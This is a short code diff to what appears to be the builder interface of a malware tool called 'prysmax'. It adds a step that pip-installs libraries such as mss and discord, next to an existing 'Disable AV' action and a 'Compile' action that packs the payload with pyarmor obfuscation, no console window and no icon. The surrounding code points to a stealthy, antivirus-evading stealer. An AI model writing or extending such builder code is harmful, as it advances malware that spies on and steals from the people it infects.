@@ -42,7 +42,14 @@ def main():
         elif event == 'Disable AV':
             disable_av()
         elif event == 'Download Libraries':
-            # Add your code for downloading libraries here
+            libraries = ['mss', 'discord', 'requests', 'ctypes', 'tempfile']
+
+            for lib in libraries:
+                try:
+                    subprocess.check_call(['pip', 'install', lib])
+                    print(f"Installing {lib}...")
+                except subprocess.CalledProcessError as e:
+                    print(f"{lib}: {e}")
             pass
         elif event == 'Compile':
             subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" builder\\prysmax.py', shell=True)
